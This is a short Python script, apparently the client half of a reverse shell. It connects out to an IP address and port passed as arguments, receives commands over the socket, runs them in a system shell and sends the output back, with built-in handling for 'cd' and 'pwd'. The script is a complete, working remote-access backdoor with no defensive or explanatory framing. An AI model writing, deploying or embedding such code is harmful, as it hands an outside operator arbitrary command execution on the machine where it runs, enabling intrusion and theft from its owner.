import socket
import subprocess
import sys
import os

def session_handler():
    sock.connect((server_ip,server_port))
    print("Connected with ", server_ip)
    while True:
        try:
            msg = conn_in()
            if msg == "exit":
                print("Server terminated connection")
                sock.close()
                break
            elif msg.split(" ")[0] == "cd":
                try:
                    directory = str(msg.split(" ")[1])
                    os.chdir(directory)
                    res = "Changed to " + os.getcwd()
                    conn_out(res)
                except FileNotFoundError:
                    msg = "Invalid directory. Enter valid directory"
                    conn_out(msg)
                    continue
            elif msg.split(" ")[0] == "pwd":
                print(os.getcwd())
                res = os.getcwd()
                conn_out(res)
            else:
                com = subprocess.Popen(msg, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                res = com.stdout.read() + com.stderr.read()
                conn_out(res.decode())
        except KeyboardInterrupt:
            print('\n keyboard interrupt issued')
            sock.close()
            break
        except Exception:
            sock.close()
            break
def conn_in():
    print("waiting for server")
    while True:
        try:
            res = sock.recv(1024).decode()
            print(res)
            return res
        except KeyboardInterrupt:
            print("\n keyboard Interrupt")
            sock.close()
        except Exception:
            sock.close()
def conn_out(msg):
    message = str(msg).encode()
    sock.send(message)

if __name__=='__main__':
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        server_ip=sys.argv[1]
        server_port=int(sys.argv[2])
        session_handler()
    except IndexError:
        print("\n Missing arguments")
    except Exception as e:
        print("\n")
        print(e)